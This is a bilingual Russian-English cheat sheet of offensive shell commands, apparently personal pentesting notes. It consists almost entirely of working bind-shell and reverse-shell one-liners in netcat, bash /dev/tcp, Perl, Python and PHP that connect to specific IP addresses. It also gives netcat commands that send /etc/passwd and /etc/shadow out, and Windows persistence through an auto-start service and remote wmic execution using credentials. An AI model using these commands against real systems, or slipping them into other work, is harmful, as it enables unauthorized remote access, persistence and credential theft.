#Bind Shell

##Nc
`nc -lvp 4444 -e /bin/sh`

##Web-сервер
`python3 -m http.server`

##Подключение
`nc 192.168.1.135 4444`

#Reverse Shell

##Tcp Linux
`bash -i >& /dev/tcp/172.15.9.212/4444 0>&1`

## Nc Linux 

### Параметры

`-n` - don't perform a name lookup
`-v` - verbose, show when a connection is established
`-l` - visten
`-p` - the port to listen on
`-z` - without sending any data
`-w2` - waiting no more than two seconds for a connection to occur
`-d` - (windows only) detached process, поэтому не появляется консольное окно

Создание простого шелла:

`nc 10.0.2.15 4444 -e /bin/bash`

Выгрузка тексового файла пользователя:

`nc -nvlp 8080 < /etc/passwd`

Выгрузка текстого файла, требующего повышения привилегий:

`sudo cat /etc/shadow | nc -nvlp 8080`

Выгрузка бинарного файла:

`nc -vnlp 8080 < ./i.jpeg`

`nc 192.168.1.114 8080 > i.jpeg`

## Nc Windows 

### Запуск через сервис (от System)

Локальное создание и запуск службы:

`sc create PersistNcService binpath= "cmd.exe /k c:\tools\netcat-win32-1.12\nc.exe -l -p 3333 -e cmd.exe" start=auto`

Живёт более 30 секунд за счёт _cmd.exe /k_
`cmd /K` carries out the command specified by string but remains

Удалённое создание и запуск службы:

???????????????????????

### Запуск через wmic (от Администратора)

Локальный запуск

`wmic process call create "c:\tools\netcat-win32-1.12\nc.exe -ldp 4444 -e cmd.exe"`

Удалённых запуск

`wmic /node:192.168.1.15 /user:"user" /password:"password" process call create "c:\tools\netcat-win32-1.12\nc.exe -ldp 4444 -e cmd.exe"`

`-d` - detached process, поэтому не появляется консольное окно

Завершение работы

`wmic process where name="nc.exe" delete`

##Perl

`perl -e 'use Socket;$i="192.168.1.135";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

##Python

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.135",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`


##Php
`php -r '$sock=fsockopen("192.168.1.135",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`

##Создание сервера
`nc -lvp 4444`